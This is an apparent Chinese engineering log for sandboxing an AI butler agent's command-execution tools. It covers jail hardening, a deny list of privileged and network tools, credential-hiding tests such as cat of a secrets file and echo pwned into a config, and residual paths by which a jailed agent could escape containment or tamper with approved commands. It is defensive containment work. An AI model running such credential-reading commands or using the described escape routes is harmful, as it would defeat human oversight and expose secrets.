顺序按用户优先级：**M1→M2（手）→M3（手机）**先，M4/M7 次之，M5/M6 后置；M2b 在 M2 后按需。
每刀：新单测 + 四门 PASS（旋钮 116）+ 一刀一 commit；M2/M3 必过 Codex 交叉审（M2b 的装配层同批送审）。

---

## 七、显式不做

- 每任务云 VM / 独立容器（岔口 5 已拍同机监狱；行业形态在，但撞轻量与自托管）。
- 浏览器自动化 / computer use（独立 AI 浏览器形态 2026-08 已被行业判死；若要走 MCP 浏览器连接器
  另起 track，且仍在闸后）。
- 阿同自注册账号 / 自取 key / 自管凭证值（LSA-M0 立场不变：发现+建议，人录入）。
- 自动转发凭证、blanket grant、root 级动作（apt/systemctl）——结构性做不了，也不该做。
- 子代理 swarm / 多小时无人自治（一消息一任务 ≤16 轮不动；长活走工作流 + 定时）。

---

## 八、验收纪律

`packages/*` 只动 personal-butler（策略）/ host（执行器、桥命令、投影）/ core（`unshareNet` 一处
additive）；四门 PASS 全程；每个新 builder 过 AFR 注册三件套（tiers 名单 / toolface tripwire /
门）；真机 round-trip 以「盘上产物 + 审计行」为准；安全承重刀（M2/M3）Codex 交叉审后才 commit
收口。

---

## 九、M1 落地记录（2026-08-15）

`packages/personal-butler/src/hands-policy.ts`（host-free 纯核，30 单测）：

- **形状**：`classifyHandsAction(action, ctx) → {tier, verdict, code, resolvedPath?, net?}`，`verdict`
  直接是 `GovernedVerdict`；`handsGovernedClassifier(ctx)` 是给 `GovernedActionToolset.classify` 的
  适配器（`(name, args) → verdict`，未知名/坏形状 → refuse）；`classifyHandsToolCall` 给执行器用（多回
  `resolvedPath`/`net`）；`resolveWorkspacePath` 单独导出——**M2 执行器每次文件操作都必须过它**，且用
  它回的绝对路径，绝不重新解析模型给的串。`HANDS_LIMITS`（120s/32KB/512MB/1024 字符/256 argv/8KB
  参数/1MB 写/256KB 读/并发 1）是唯一真相，执行器只执行不另定。
- **文件动作**：形状门（绝对路径/`~`/反斜杠/控制字节/空/超长 → `path_invalid`）→ 词法 `isInsideRoots`
  （复用 core，`..` → `path_escape`）→ **realpath 锚定**（最深存在祖先 realpath + 未存在尾巴回接，
  结果仍须在根内；指向外的符号链接目录/文件 → `path_escape`）→ **变更动作拒经符号链接终点**（write/rm
  遇终点是链接一律 `path_symlink`，**悬空链接也拒**——否则 `writeFile` 会顺着悬空链接在工作区外「创建
  穿透」）。指回工作区内的链接照常可读（pnpm `node_modules/.pnpm` 布局依赖这点）。根自身按 realpath
  比（macOS `/tmp`→`/private/tmp` 那类不匹配不会把整个工作区误拒）。探针抛异常 → refuse 绝不 allow。
- **执行动作**：argv 形状门（空/非串/>256 项/单项 >8KB/含 `\t\n\r` 以外控制字节 → `run_invalid`）→
  **拒绝表按 argv[0] basename**（sudo/su/doas/pkexec · apt/dpkg/yum/dnf/apk/pacman/brew/snap ·
  systemctl/service/systemd-run/reboot… · docker/podman/bwrap/sandbox-exec/unshare/nsenter/chroot/
  mount · crontab/at/launchctl · osascript/open/xdg-open → `run_forbidden` tier 3，全路径与大小写
  照抓）→ cwd 过同一解析器 → **`net` 决定 1/2 档**：`net:true` 或按表推断为联网（curl/wget/ssh/
  scp/rsync/gh 恒联网；git clone/fetch/pull/push/ls-remote/submodule；npm/pnpm/yarn install|add|ci|
  update|publish|audit|…；pip/uv/poetry/cargo/go/gem/bundle/composer 装包类）→ tier 2 approve，理由
  带命令名与「按命令推断」；否则 tier 1 allow。**推断只是 UX**：推错的命令在断网监狱里失败一次，模型
  加 `net:true` 重来（那才是审批点）；`npx`/`pnpm dlx` 刻意不列（开发区多跑本地 bin，逢用必批太吵）；
  显式 `net:false` 赢过推断（离线跑无害）。**解释器/shell 不 park**——与 layer-1 `jailArgv` 相反，
  因为手 A 有 layer-2 内核监狱兜底。
- **变异测试三门全红**（去掉终点链接拒 → 2 例红；去掉 realpath 越界拒 → 3 例红；关掉联网推断 → 3 例
  红），复原 byte-identical。四门 PASS（旋钮 116 零新增）；personal-butler 184（+30）。

**M1 期间钉下的 M2 前置备忘**（写在这里免得实现时忘）：
1. TOCTOU：hub 进程做文件操作，监狱内子进程理论上可在检查与写之间把目录换成链接。M2 靠三件缩窗：
   每成员并发 1 + 每次 `hands_run` 结束即杀整个进程树（Linux 补 `--unshare-pid`——`--die-with-parent`
   `buildBwrapArgs` 已有——使后台进程活不过一次运行；macOS 无 pid 命名空间，`setsid` 双 fork 的守护
   进程是**如实残余**）+
   写文件用 `O_NOFOLLOW`（终点原子拒链接；祖先目录换链接仍是残余，Node 无 `openat`）。
2. `--ro-bind / /` 会让 `<space>` 在监狱内可读——M2 必须 `--tmpfs <space>` 盖掉再把工作区 bind
   回去（bind 按顺序处理，后者盖前者），门=监狱内 `cat <space>/gotong.env` 失败；macOS seatbelt
   profile 要补 `(deny file-read* (subpath "<space>"))` 例外工作区 + `(deny network*)`（当前
   `buildSeatbeltProfile` 只限写不限读不限网）。
3. `unshareNet` 与上面两条都是 `wrapWithFsJail` 的可选新参数（additive，既有 cli-agent/acp-agent
   调用者字节不变）；这是本 track 唯一的 core 触碰。
4. 备份：`gotong backup` 会把工作区（可能含 `node_modules`）打进档案——M2 决定是否排除
   `butler/hands/**/workspace/node_modules`（倾向排除并在档案 note 里写明）。

---

## 十、M2 落地记录（2026-08-15）

`packages/host/src/personal-butler-hands.ts`（约 1300 行）+ core `FsJailHardening`（additive 六键）+
factory/self-status/capabilities/main.ts 接线 + cli 备份排除；host 承重门
`tests/personal-butler-hands.test.ts` **69 例**（其中 23 例在真 OS 监狱里 spawn——文件四工具也在这
一层），core `workspace-jail-os.test.ts` **33 例**，另有共享审批文案的 `approval-text.test.ts` **14 例**
与跨入口的 `approval-copy-shared.test.ts`。**Codex 交叉审七轮**（§10.5）：每一轮都是对**上一轮修完的
代码**再审，前六轮的结论都是「修了再提交」——5H/4M/1L → 2H/6M/2L → 3H/3M → 3H/3M → 2H/1M/1L →
2H/2M/1L → 2H/2M/3L，全部修入。其中四条是**前一轮的修法自己引入的**（二轮 S1：藏 HOME 会把 HOME
下的工作区一起盖掉；五轮 H1：四轮把写进去的那行字修对了，读出来那行仍在硬截断；七轮 M3：六轮为了挡
盲签而收窄，误伤了 21 条本来短小的画廊 human 步；七轮 M4：六轮把短码换成内容指纹后，「至少 4 位」这个
下限跟着失去了意义），这正是多轮审的价值所在。

### 10.1 形状（与 §4.2 一致，这里只记「为什么这样」）

- **一个 `GovernedActionToolset` 挂五工具**，`classify` = M1 `classifyHandsToolCall` 原样（tier 2 联网
  命令在 park 前先查工作区配额——满了当场 refuse，**绝不浪费一次审批**）；`execute` **每次重跑同一份
  策略**拿 `resolvedPath/net`（refuse 只回 isError **绝不重新 park**——park 的裁决权只在 classify）。
  工具描述里把边界说给模型听（「命令看不到 hub 的配置与凭证，家目录整个不可见」「不能 sudo/装系统包
  /管服务」）——模型早知道做不了的事，就少一次白跑。给模型看的**错误文本把 hub 绝对路径换成
  `<space>`/`<workspace>` 占位**（路径本身就是布局情报；成功文本只含相对路径）。
- **构造零副作用**：工作区目录第一次用到才建（装了手但成员从没伸手，盘上零痕迹）；`armButlerHands`
  在 `hands.json` 缺席时**不探监狱、不建目录、不打日志**（缺席 = 与今天逐字节一致，门钉死）。
- **藏什么（`jailShapeFor`，arm 时算一次，hub 级事实）**：`hiddenPaths` = `<space>` + **hub 用户 HOME**
  + `/home` + `/root` + `/run/user`（存在的才盖——bwrap 要有挂载点）+ `hands.json` `hidden` 追加的目录；
  `hiddenFiles` = `/etc/gotong.env`（runbook 默认 EnvironmentFile）+ docker/podman 套接字（存在才盖）+
  `hidden` 追加的文件；`readOnlyRoots` = **落在藏起来目录里的 node 前缀**（nvm 装在 HOME 时——文件小
  助手与成员的 `node` 都要它；前缀是公共工具链不是私产）+ `readOnly` 追加的；HOME 是 `/` 或探不到
  就不藏（盖住根等于焊死监狱）。首版只藏 `<space>` 是 Codex 首轮 H1：生产 `gotong.env` 就在 hub 用户
  HOME 下（`/home/ubuntu/aipehub/gotong.env`），`~/.ssh`/`~/.netrc`/`~/.npmrc` 同理，「凭证结构性缺席」
  只对 `<space>` 成立是半句话。
- **`hiddenPaths` 是承重件不是锦上添花**：seatbelt 的 `MAC_ESSENTIAL_WRITABLE` 含 `/var/folders`（进程
  要活着必需的临时区），而测试/开发环境的 `<space>` 就住在 tmpdir 下——变异测试证实**去掉 `hiddenPaths`
  后监狱内 `echo pwned > <space>/agents.json` 会成功**（essential-writable 放行了它）；有了后置的
  `deny (subpath <space>)`（SBPL 后规则赢）才真的写不进、读不出。bwrap 侧同理：`--ro-bind / /` 让
  `<space>` 可读，必须 `--tmpfs <space>` 盖掉再把工作区 `--bind` 回去（bwrap 按 argv 顺序挂载，**顺序即
  语义**：tmpfs 藏 → ro-bind 再放开只读 → bind 工作区 → ro-bind /dev/null 盖点名文件 → remount-ro）。
  `denySharedTmp` 把 `/tmp` `/private/tmp` `/var/folders` 从 seatbelt 可写根里拿掉（bwrap 本就是私有
  tmpfs `/tmp`），子进程 `TMPDIR=<workspace>/.hands-tmp`（监狱内的 shell 前奏一级 `mkdir`，hub 自己
  一个字节不写）——共享 /tmp 是同机其他进程的通道，也是 macOS 上 seatbelt 藏不住的空档。`hardening`
  刻意**不进 `FsJailSpec`**——cli-agent/acp-agent 按名拷字段，塞进去会被静默丢；手 B（M2b）需要时显式穿。
- **seatbelt 侧 `unsharePid` 不再是空转**：映射成 `(deny signal)(allow signal (target same-sandbox))
  (deny process-info*)(allow process-info* (target same-sandbox))(deny lsopen)(deny appleevent-send)`——
  真机探针钉的（`(deny signal (target others))` 这种写法**静默无效**，只有无过滤 deny + same-sandbox
  allow 才挡得住 `kill <hub pid>`；`open -g -a` 在基线 seatbelt 里**能**经 LaunchServices 在监狱外起
  进程，`(deny lsopen)` 才关上；`osascript` AppleEvents 由 `(deny appleevent-send)` 关）。首版这里是
  Codex 首轮 H2（macOS 无 pid 命名空间，`unsharePid` 一度只是 bwrap 的事）。
- **子进程环境从零拼**（`childEnv`）：PATH（**arm 时过滤过的那份**：只留绝对路径、去重、剔掉落在藏起来
  目录里的项——再放开的除外——并把 node 自己的 bin 补在最前）/HOME=工作区/TMPDIR=工作区/.hands-tmp/
  LANG/TERM/NO_COLOR + 标记 `ATONG_HANDS=1`（给监狱里脚本认「我在阿同手里」；**刻意不带 `GOTONG_`
  前缀**——那是 hub 旋钮的姓，env-registry 门按前缀清点 116 冻结，一个不是旋钮的名字不该占旋钮的额；
  首版叫 `GOTONG_HANDS` 被门抓成 121≠120 才改）；只有 `net:true` 才放行 `HTTP(S)_PROXY/NO_PROXY`，
  **且 URL 里带 `user:pass@` 的代理不放**（那也是凭证；Codex 首轮 M）。绝不 `...process.env`——hub 进程
  里的 `*_API_KEY`/主钥/IM token 结构性到不了监狱（门：监狱内 `env` 输出零 `HANDS_TEST_SECRET`）。
- **文件四动作在监狱里做**（Codex 首轮 H3 的修法）：`hands_write/read/list/rm` 各 spawn 一次监狱内的
  `node -e <内嵌小助手>`（零依赖、一件事一次调用、结果一行 JSON），与命令同一份 hardening（离线 +
  藏同样的东西）。为什么不让 hub 自己 open：监狱里的命令能在检查与动手之间把目录换成指向 `<space>` 的
  链接（TOCTOU），hub 若以自己的权限 open 就会读走 vault、写坏 `agents.json`——`O_NOFOLLOW` 只守最后
  一段，Node 没有 `openat`；小助手在同一座监狱里，链接换过去内核照样拒（门：策略放行后把目录换成指向
  `<space>` 的链接，写不进 `agents.json`、读不出 `gotong.env`、列不出目录）。小助手内仍 `O_NOFOLLOW|
  O_NONBLOCK`（`O_NONBLOCK` 是因为监狱里的命令能 `mkfifo`，同步 open 一个 FIFO 会挂死）+ 前 8KB 嗅探
  二进制 + 超 256KB 只显示前段并注明；`hands_list` 排序、四类型、200 项顶（扫描顶 5000）；`hands_rm`
  拒工作区根、递归不跟链接。代价：每个文件动作一次 node 冷启动（≈50ms）。写前算配额（512MB 字节 +
  **100k 文件数硬顶**——字节配额挡不住「一百万个空文件」；`measureTree` **流式 `opendirSync`** 到顶即
  停——这是 hub 侧唯一碰工作区的只读动作，只数不读，链接换目录最多让计数失真）。
- **`hands_run`**：监狱内先套一层 `/bin/sh -c`：建 TMPDIR、`ulimit -c 0`（不出 core）、`ulimit -f
  ⌈配额/512⌉`（单文件不超工作区配额）、`ulimit -u 2048`（进程数封顶，每条 `2>/dev/null`——硬上限比要
  的低就保持原样绝不因此起不来），然后 `exec` 真命令。`detached:true` 自成进程组；**命令一退出就
  `kill(-pid, SIGKILL)` 收整个进程组**（Codex 首轮 M：后台 `&`/守护进程不该活过这一条命令——下一条动作
  开始时工作区里没有别人；门：`(sleep 3; echo alive > late.txt) & echo started` 后 late.txt 不出现）；
  超时/洪水同样收组；stdout/stderr 走 `TailBuffer` 只留尾 `maxOutputBytes`（默认 32KB），总量超 `64×`
  上限（2MB）**提前终止**；退出后再等 stdio 关闭最多 1s（逃出进程组的守护进程抓着管道不能无限等）；
  `stdin` 可选 ≤1MB，**进审批标题**（字节数 + 去控制字符的 80 字摘要——「联网执行 sh」加一段 stdin
  就能把整个动作藏在标题后面；Codex 首轮 M）；`timeoutSec` 钳到 `maxRunSec`；回执首行固定
  `exit N · 秒 · stdout B · stderr B · 联网/离线 · cwd`，非零/超时/超输出一律 `isError`。
- **审计** `<memberRoot>/audit.jsonl`（0600，>1MB 轮转成 `.1`）：每次动作一行——tool/code/tier/argv
  （单项截 200 字）/cwd/exit/signal/ms/字节数/timedOut/overflow/net/jail/**stdinBytes+stdinSha256**；写读
  只记 `{path, bytes}`。**不落 stdout/stderr/stdin 正文**（门：`printf AUDITBODY` 的回执有它、审计文件里
  没有；stdin 正文同样只有 sha256）。
- **并发 1/成员是 hub 级**：`BUSY` 是模块级 `Map`（键 `handsRoot::userId`）不是 toolset 实例态——同一成员
  在同一进程里被建了两份 toolset（会话窗与 IM 各一份）也只有一双手（Codex 首轮 M；门：另一份 toolset
  同样被拒「还在跑」）；在 `execute` 的同步前缀里置位，第二条动作来了响亮拒不排队。
- **接线**：factory 只在 `deps.hands?.host` 在场时把五工具并进 governed 面（`my_status` 多一行「手：
  已装(bwrap)/未装(原因)」；B1 能力清单 `hands_run/hands_write` 信号）；main.ts +4 行 `armButlerHands`
  （棘轮 2770→2780 显式抬，理由记 gate）。**缺席字节不变**在 tiers 测试里是结构性断言：dep 不传 ≡
  `armed:false` ≡ armed 面 − hands_* 五个名字。
- **备份**：`gotong backup` 全量档跳过 `butler/hands/user/<id>/workspace/**/node_modules`（walk 时剪枝
  + staging 过滤两层同一个 `isHandsScratchPath`）；源码/审计照进；别处同名目录照进（`workflows/
  node_modules/keep.txt` 门）；tier 档白名单本就不含 hands。

### 10.2 门（doc §六 M2 行逐条）

本机 macOS `sandbox-exec` 真 spawn 全过（`personal-butler-hands.test.ts` **69 例**，其中 23 例真 spawn；
另有审批文案的两道专属门 `approval-text.test.ts` 14 例 + `approval-copy-shared.test.ts` 4 例，
以及 IM 投影侧的 `im-approval-service.test.ts` 16 例）；bwrap 由 argv 顺序单测钉死
（`--tmpfs <hidden>` 早于 `--ro-bind` 早于 `--bind`、`--ro-bind /dev/null <file>` 与 `--remount-ro`
晚于、`--unshare-net/--unshare-pid` 在场），Linux 真机跑一次即成事实（`HANDS_TEST_REQUIRE_JAIL=1` 让
无监狱的机器整文件红而不是静默 skip——CI 用）。

| 门 | 证据 |
|---|---|
| `cat <space>/gotong.env` 失败 | 监狱内 `cat` 出码非 0，回执零 `SECRET`；`hands_read ../../../../../gotong.env` classify refuse；`sh -c 'ls <space>'` 看不到 `agents.json` |
| 写 `<space>/agents.json` 双拒 | 监狱内 `echo pwned > <space>/agents.json; echo rc=$?` 不是 `rc=0` 且文件字节不变；`hands_write` 穿越 refuse；工作区内 `mkdir -p sub && echo hello > sub/note.txt` rc=0 且 `hands_read` 读到 |
| HOME / 点名文件藏起来 | 假 HOME（探针缝）里的 `.ssh/id_test`/`.netrc` `cat` 不吐值、`ls -A` stdout 列不出名字；`hidden` 点名的 `etc/gotong.env` `cat` 不吐值（bwrap 是 /dev/null 盖住、seatbelt 是 deny——两种都不吐）；没点名的地方照常可读（监狱藏的是 hub 的凭证不是整台机器）；**真探针**形状藏起 hub 真 HOME 后 `node -e` 照跑（前缀再放开只读）、PATH 里落在 HOME 的项只剩再放开的、文件小助手照常写 |
| TOCTOU 真闸 | 策略放行后 `proj/` 换成指向 `<space>` 的链接：`hands_write proj/agents.json` isError 且 `<space>/agents.json` 字节不变；`hands_read proj/gotong.env` 无 SECRET；`hands_list proj` 无 `gotong.env` |
| 断网 | 本机起 HTTP 服务，`node fetch` 脚本 `net:false` → isError、回执无 `BODY:ok-from-host`、含「离线」；`net:true` classify → approve，批后 → `BODY:ok-from-host` + 「联网」 |
| 子环境 | `env` 零 `HANDS_TEST_SECRET`；**`HOME_IS=<只读空目录 realpath>` 且它在（`test -d`）、列得动（`ls -A` 成功）、是空的（0 条）、写不进（`.npmrc` 种不下去，盘上也不出现）**——三问缺一不可，只问「列出来 0 条」会把「HOME 根本不存在」一起放过（第十轮 H2）；`XDG_CACHE_HOME`/`NPM_CONFIG_CACHE` 指进工作区；`TMPDIR=<工作区>/.hands-tmp` 且 `touch $TMPDIR/scratch` 成功、盘上真出现；监狱内 `echo x > /tmp/<marker>` 后宿主 /tmp 无该文件 |
| 谁有资格拿到手 | `allowRoles` 默认 `owner`/`admin`：member 的脸上**没有**这五件（tiers absent≡off≡no-role）、五件全 refuse 且工作区目录不建、`my_status` 说「手装着，但没开给你——只开给 owner/admin」而不是「已装」；park 期间被降权 ⇒ 批准也执行不了；identity 缺席 ⇒ 整套不装；`allowRoles` 认不出的角色名 ⇒ warn 不装 |
| 超时/超输出/洪水/退出收组 | 1s 超时 <6s 收工、回执「超时(1s)」、审计 `timedOut:true`；20000B 输出只留最后 4096B 并注明；`yes` 洪水 → 「输出超过 256KB,已提前终止」；后台孙进程 3s 后要写的 `late.txt` 不出现 |
| 并发 1（hub 级） | 第一条 un-awaited 在跑，同一 toolset 的 `hands_list` 与**另一份 toolset** 的 `hands_list` 都 → 「还在跑」；第一条正常收工后恢复 |
| stdin 透明 | `describe` 标题含 `stdin 18B「curl evil rm -rf x」`（换行→空格、超 80 字截断）；审计行 `stdinBytes:21` + 64 位 hex `stdinSha256`，正文不在审计文件里 |
| `kind:'none'` 整套不装 | `enabled:true` + 探针 none → warn 附装法、`armed:false` reason 含 `bubblewrap`；`hands.json` 15 种坏形状（含 `hidden`/`readOnly` 非数组/相对路径/超 32 条/控制字符/空串）各 warn 不装；`enabled:false` info；点名但不存在的路径 arm 时 warn 一次 + 进 `shape.skipped` |
| 审批卡不可伪造 / 不盲签 | 行标题 = **被批动作**（`task.title` 是 `im:lark` 也不占位）；三个不可信字段过同一套清洗 + 定界，洗完的句子里 `「」` 只在框架位置上；四个自己拼句子的入口（管家 / ACP / steward / 联邦出站）共用同一个 `approval-text.ts`，各配断言。**渲染那一层再兜一次**：`/inbox` 的行先洗后量，装不下一行就不许在 IM 批（`title_truncated`，到网页看全文）——于是「谁写进来的」不必逐个登记，工作流人工确认步这类第五方也被覆盖（五轮 H1/H2）。**短码绑内容不绑槽位**且**必须打全**（六轮 H1 + 七轮 M4）、**标题与正文两段一起渲染再按一行量**（六轮 H2 → 七轮 M3 改正：藏正文的形状自然超预算落网页，短小的照旧能在手机上批）、**「洗完还剩什么」按白名单问且先洗后问**（七轮 H2）；**批准落笔前在 store 的原子事务里再验一次代际**，被掉包就 `stale_item` 一个字节不写（七轮 H1） |
| 可批准 ≡ 可留档 | 策略 argv 总量顶与台账容量是同一个常量；**上限那一点**的命令原样进台账、零截断标记；台账记结构化 argv 向量（`['printf','a b']` 与 `['printf','a','b']` 分得开） |
| 每趟都留痕（并发下也是） | 同一成员两次并发：先进门那趟早退 + 后一趟被 `BUSY` 拒，两条各留各的行（兜底状态跟着调用走，不是 toolset 共用一格） |
| HOME 藏不住就停手 | arm 时与**每次 spawn 前**用逐字相同的三条件判死（`/`、空、相对路径）；arm 之后 HOME 变样 ⇒ 这一步 isError 且工作区无字节落地，台账上 `begin` + 兜底两行看得见 |
| 缺席字节不变 | `armButlerHands` 缺席零副作用；tiers 测试 absent≡off≡armed−hands_* |
| 凭证缺席 / 审计不落正文 / 路径不外露 | 见 10.1；父路径是文件时的写失败文本不含 `<space>`/工作区绝对路径 |

**变异测试三门**（每次先断言真的改动了文件，跑红，`cmp` byte-identical 复原）：去掉 `hiddenPaths`
→ 门①②红（正是 10.1 说的 essential-writable 坑）；`unshareNet` 恒 false → 断网门红；去掉 `busy`
判断 → 并发门红。core 侧 seatbelt 规则由真机探针脚本逐条证实后才写进 `MAC_PROCESS_ISOLATION`。

### 10.3 前置备忘四条的回答（§九）

1. TOCTOU：**文件动作搬进监狱**（小助手）是真闸；并发 1（hub 级）+ 每次结束 `kill(-pid)` 整进程组 +
   Linux `--unshare-pid` + `O_NOFOLLOW` 是缩窗；**残余如实**：macOS 无 pid 命名空间，`setsid` 双 fork
   的守护进程活得过一次运行（stdio 1s 宽限保证 hub 不被它拖住）——但它能碰的只剩本成员自己的工作区
   （其他成员的工作区与 `<space>` 它一样进不去）。
2. `--tmpfs <space>` + seatbelt `deny file-read*/file-write*`：落地为 core `hiddenPaths`（见 10.1），且
   扩到 HOME/点名文件/再放开只读。
3. `unshareNet` 等 additive：落地为 `FsJailHardening` 六键，缺席 = 经典 argv/profile 逐字节一致
   （core 单测钉 `hardening:{}` 与不传同形）——本 track 唯一 core 触碰。
4. 备份排除：落地（10.1 末条）；档案 note 未写（工作区本身仍进档，只少 `node_modules`，恢复后
   `npm install` 一次即回，不值一条 note）。

### 10.4 诚实残余

- **代际闸只接在 IM 那条路上**（七轮 H1）：`/approve <短码>` 会把「我在批的是哪一代」作为谓词传进
  store，网页 `/me` 的收件箱按钮不传——它按 `itemId` 直接 resolve，同一个 id 在页面渲染之后被重新 park
  成另一个动作，点下去批的仍是新的那一代。**要补的不是 store**（那道闸已经是通用的），而是让 `/me` 的
  投影 DTO 带上同一个指纹、SPA 原样回传。挡它的是这需要动 `/me` 的返回形状与前端一跳，不属于这一刀；
  已挂独立票。网页那一侧的窗口比 IM 小（人正看着那张卡、不存在「从聊天记录里往上翻」），但它确实还在。

- **IM 那一行没有不可伪造的定界符**（九轮 L1）：审批**正文**里，框架用「」把不可信文本包起来，而写入方
  已把文本里的「」（含相似字）降级成『』——所以正文里的框架定界符只可能是框架放的，「伪造一句 hub 说的
  话」结构上不成立。`/inbox` 的**一行**没有这层结构：那一行就是标题/正文本身，前后只有一个 `[短码]`。
  相似字名单、清洗、「读不全就去网页」都照做，但「这一行里哪一段是框架说的」在 IM 里没有结构性答案。
  真要补，得给每一行加一个文本侧伪造不出来的边框，那会动六座桥共用的渲染层。现状的影响面被钉子②限住：
  高危动作本来就不在 `IM_APPROVABLE_TOOLS` 名单上（`hands_*` 全部在外），见 `docs/zh/IM-APPROVAL.md` §五。

- **藏起来的以外的宿主文件系统监狱里可读**（系统目录、`/opt`、`/etc` 里没点名的、其他用户 0755 的家）
  ——「凭证结构性缺席」说的是 hub 自己的凭证（`<space>`、HOME、点名文件），不是整台机器；把 hub 用户的
  凭证放在 HOME/`<space>`/`/etc/gotong.env` 之外的操作者要用 `hands.json` `hidden` 点名。
- 配额是**动作前丈量**不是运行期硬界：命令跑着的时候能把盘写到 `ulimit -f`（单文件 = 配额）的上限
  数倍；内存不设界（无 cgroup）；bwrap 私有 `/tmp` tmpfs 无大小上限（洪水写能吃 RAM 到超时/收组）。
  且 **`ulimit` 三条都是软的**：每条带 `2>/dev/null`，硬上限比要的低（或 shell 不认 `-u`）时**保持
  原样继续跑**——绝不因为压不下限额就让命令起不来。它们是「别把机器拖垮」的兜底，不是承重门；承重的
  是时限、输出顶、退出即收组和监狱本身。
- macOS：孙进程只要自己 `setsid()` 就脱离进程组，**命令退出时的 `kill(-pid)` 收不到它，它会一直活着**
  （Linux 侧 `--unshare-pid` 使 pid 命名空间 init 一退整片被内核清掉，无此残余）。试过的清扫办法都不成立
  ——`ps -E` 在本机不吐同 UID 分离进程的 env，认不出「这是手起的」，宁可如实记档也不做会误杀用户进程的
  按名清扫。开发机的 `/dev/ttys*` 在监狱里可写（`/dev` 是 essential-writable）；同 UID 其他进程的 argv 经
  `kern.procargs2` 仍可见（env 不可见——真机探针证）；Mach/XPC 面没有逐服务收窄（keychain 靠藏 HOME 挡，
  `launchctl` 起后台任务在 macOS 26 被 launchd 自己拒掉 —— `(deny job-creation)` 是第二把锁）；BSD
  `mkdir -p` 用**绝对路径**穿藏起来的祖先会 EPERM（用相对路径；Linux bwrap 无此问题，tmpfs 挂载点存在）。
  生产 = Linux，这些是开发机注脚。
- 审计台账轮转只留一代 `.1`，阈值从策略层的 argv 上限推出来（≈12MB，见 §10.5 六轮 M3）。**动手前**会真落一行 `begin`（写不成就 fail-closed 拒绝，见 §10.5 三轮 M5），但
  **事后** append 失败（盘刚好满在这一瞬）只 warn——动作已经发生，拒绝收不回。`begin` 那行的承诺**只到
  进程崩溃**：`appendFileSync` 不 fsync，整机断电时它可能还在页缓存里没落盘，故这条不承诺断电语义
  （四轮确认；要断电语义得每行 fsync，那是给每次动手加一次同步刷盘的代价，这双手不值这个价）。
  轮转本身天生是个**窗口**：发足够多顶格 argv 的动作仍能把旧行推出去（阈值 ≈12.3MB ≈ 40 条顶格动作，
  或**约一万四千条**正常动作——一条动作记三行、一行约 300 字节，七轮 L7 纠正了此前把行数当动作数的算法）。
  挡不住，只能让它变贵且留痕——那些动作每一条自己都先被记了下来（六轮 M3）。
  **台账本身不在工作区配额之内**（它在 `<space>` 侧，手够不到）：最坏情况是每成员 ≈2 代 × 12MB，
  没有 hub 级总量顶——真要治得给台账一个独立的总盘子，记档不做（六轮 M3）。
- 审批标题里的命令到 600 字符为止，超出明说「共 N 字符，已截断，完整命令见审计台账」——**兑现得了**：
  分级那一刻的 `classify` 行带完整 argv，且策略层的 argv 总量顶（16KB）与台账的容量是**同一个常量**
  （四轮 H2），于是「可批准的命令」必然是「可留档的命令」。stdin 摘要到 240 字符为止，截断处只说「共 N 字符，已截断」
  **不指台账**——台账只留 `stdinBytes`+`stdinSha256`，正文永不落盘，指向一个并不存在的「完整内容」
  比不指更坏。所以 stdin 超过 240 字符时，批的人看到的确实只有开头：这是刻意的取舍（正文进台账
  = 密码、token 从此有第二份落盘副本），把它写在这里而不是假装没有。
- **HOME 只读挡的是「悄悄改」，不是「改」**（第十轮 H2 修完之后的残余）：模型仍可以在
  自己的命令里写 `sh -c 'HOME=$PWD curl …'` 或 `curl --config ./x`——但那几个字**就在人要
  读的那行 argv 里**，审批卡因此仍然诚实，这正是这条修法要保住的东西。真正被关掉的是
  「tier 1 免审批地种一个点文件，去改一条**已经批准过**、卡面上干干净净的 tier 2 命令」。
  同理，缓存目录在工作区里是可写的：投毒自己的 npm/pip 缓存做得到（内容寻址的完整性校验
  会挡掉一部分），但那影响的是它自己后续的构建，不改变任何一张已批准的卡面。
- 真 bwrap 机器上的 spawn 门待 Linux 真机跑一遍（argv 已单测钉死；M6 一键镜像的 CI 就是那台机器）。

### 10.5 Codex 交叉审账（gpt-5.6-sol，八轮）

首轮结论「修了再提交」5H/4M/1L，逐条对源码核实后**全部修入**（复审见本节末）：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1 | 高 | 只藏 `<space>`：生产 `gotong.env` 在 hub 用户 HOME 下，`~/.ssh`/`~/.netrc`/`/etc/gotong.env`/docker 套接字监狱里全可读 | 默认藏 HOME+`/home`+`/root`+`/run/user`+`/etc/gotong.env`+容器套接字（存在才盖），`hands.json` `hidden`/`readOnly` 可追加；落在 HOME 里的 node 前缀再放开只读；PATH 同步过滤 |
| H2 | 高 | seatbelt 侧 `unsharePid` 空转：监狱内可 `kill <hub pid>`、经 LaunchServices/AppleEvents 在监狱外起进程 | core `MAC_PROCESS_ISOLATION` 六条规则（真机探针逐条证：无过滤 `(deny signal)` + same-sandbox allow / `process-info*` 同型 / `(deny lsopen)` / `(deny appleevent-send)`） |
| H3 | 高 | 文件四动作 hub 侧 open：目录在检查后被换成指向 `<space>` 的链接时 `O_NOFOLLOW` 只守最后一段 | 文件动作全部搬进监狱内的 node 小助手（同 hardening），hub 不再以自己权限碰工作区字节 |
| H4 | 高 | 共享 `/tmp`（seatbelt essential-writable）是同机进程通道 | `denySharedTmp` + `TMPDIR=<workspace>/.hands-tmp`（监狱内 shell 前奏建） |
| H5 | 高 | 命令正常退出后后台孙进程活着（只在超时/洪水才收组） | `exit` 事件即 `kill(-pid)`（bwrap 下 = 整个 pid 命名空间） |
| M1 | 中 | `busy` 是 toolset 实例态，同一成员两份 toolset 各一双手 | 模块级 `BUSY` Map 按 `handsRoot::userId` |
| M2 | 中 | stdin 不进审批标题/审计 | 标题 `stdin NB「摘要」`；审计 `stdinBytes`+`stdinSha256` |
| M3 | 中 | 代理变量含 `user:pass@` 也是凭证 | `proxyUrlHasUserinfo` 过滤 |
| M4 | 中 | 无 ulimit：core dump/单文件洪水/fork 炸弹只靠时限兜 | 监狱内 `ulimit -c 0 -f ⌈配额/512⌉ -u 2048` |
| L1 | 低 | 错误文本回显 hub 绝对路径；`measureTree` `readdirSync` 整表进内存 | `redact()` 占位；`opendirSync` 流式 |

被证伪一条（不改）：「firmlink 别名绕过 seatbelt 路径匹配」——真机探针：seatbelt 按规范 vnode 路径
匹配，`deny (subpath /Users/x)` 同时盖住 `/System/Volumes/Data/Users/x`；反向（`/tmp/x` 不盖
`/private/tmp/x`）由 `variants()` 双拼写解决。

**二轮**（对首轮修完的代码再审）结论同样是「修了再提交」，逐条核实后全部收口：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
